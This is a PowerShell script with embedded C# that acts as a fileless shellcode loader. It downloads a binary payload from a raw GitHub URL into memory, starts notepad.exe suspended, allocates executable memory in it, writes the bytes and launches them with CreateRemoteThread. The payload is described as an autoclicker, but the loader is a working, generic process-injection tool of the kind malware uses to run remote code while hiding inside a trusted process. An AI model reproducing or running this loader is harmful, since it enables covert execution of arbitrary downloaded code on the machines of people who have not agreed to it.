<#
    PROJECT: Fileless Injection (Simple Shellcode Method)
    PURPOSE: Inject Donut-generated Autoclicker into Notepad
    LOGIC: Matches the "Simple C++" approach (Alloc -> Write -> Exec)
#>

# --- CONFIGURATION ---
# [IMPORTANT] Your Raw GitHub URL
$PayloadUrl = "https://raw.githubusercontent.com/stumbs/NotePadInjection/main/payload.bin"


# --- THE C# ENGINE ---
$Code = @"
using System;
using System.Runtime.InteropServices;
using System.Net;

public class SimpleLoader {
    
    // --- API IMPORTS (The Tools) ---
    
    [DllImport("kernel32.dll")]
    public static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

    [DllImport("kernel32.dll")]
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll")]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);

    [DllImport("kernel32.dll")]
    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    // [CRITICAL] We need ResumeThread to wake up the GUI
    [DllImport("kernel32.dll")]
    public static extern uint ResumeThread(IntPtr hThread);

    // --- STRUCTURES ---
    
    [StructLayout(LayoutKind.Sequential)]
    public struct STARTUPINFO {
        public uint cb;
        public IntPtr lpReserved;
        public IntPtr lpDesktop;
        public IntPtr lpTitle;
        public uint dwX;
        public uint dwY;
        public uint dwXSize;
        public uint dwYSize;
        public uint dwXCountChars;
        public uint dwYCountChars;
        public uint dwFillAttribute;
        public uint dwFlags;
        public ushort wShowWindow;
        public ushort cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION { 
        public IntPtr hProcess; 
        public IntPtr hThread; 
        public int dwProcessId; 
        public int dwThreadId; 
    }

    // --- EXECUTION FUNCTION ---
    public static void Go(string url) {
        try {
            Console.WriteLine("[*] Downloading Payload (Memory)...");
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
            WebClient wc = new WebClient();
            byte[] shellcode = wc.DownloadData(url);

            if (shellcode.Length == 0) return;

            Console.WriteLine("[*] Creating 64-bit Notepad (Suspended)...");
            STARTUPINFO si = new STARTUPINFO();
            si.cb = (uint)Marshal.SizeOf(si);
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
            
            // TARGET: System32 (64-bit)
            bool success = CreateProcess(@"C:\Windows\System32\notepad.exe", null, IntPtr.Zero, IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref si, out pi);
            
            if (!success) { Console.WriteLine("[-] Failed to create process."); return; }

            Console.WriteLine("[*] Allocating Memory (RWX)...");
            IntPtr remoteMem = VirtualAllocEx(pi.hProcess, IntPtr.Zero, (uint)shellcode.Length, 0x3000, 0x40);

            Console.WriteLine("[*] Writing Bytes...");
            IntPtr bytesWritten;
            WriteProcessMemory(pi.hProcess, remoteMem, shellcode, (uint)shellcode.Length, out bytesWritten);

            Console.WriteLine("[*] Creating Remote Thread (The Trigger)...");
            // This starts your Autoclicker in a NEW thread inside Notepad
            CreateRemoteThread(pi.hProcess, IntPtr.Zero, 0, remoteMem, IntPtr.Zero, 0, IntPtr.Zero);
            
            // This wakes up the ORIGINAL Notepad thread so the window appears
            // (Autoclicker needs a window message loop to function)
            ResumeThread(pi.hThread);
            
            Console.WriteLine("[+] Payload Injected. Autoclicker should appear.");
        }
        catch (Exception e) {
            Console.WriteLine("[-] Error: " + e.Message);
        }
    }
}
"@

# --- EXECUTION ---
Write-Host "[*] Compiling..." -ForegroundColor Cyan
Add-Type -TypeDefinition $Code -Language CSharp

[SimpleLoader]::Go($PayloadUrl)

Write-Host "`n[!] Done." -ForegroundColor Cyan
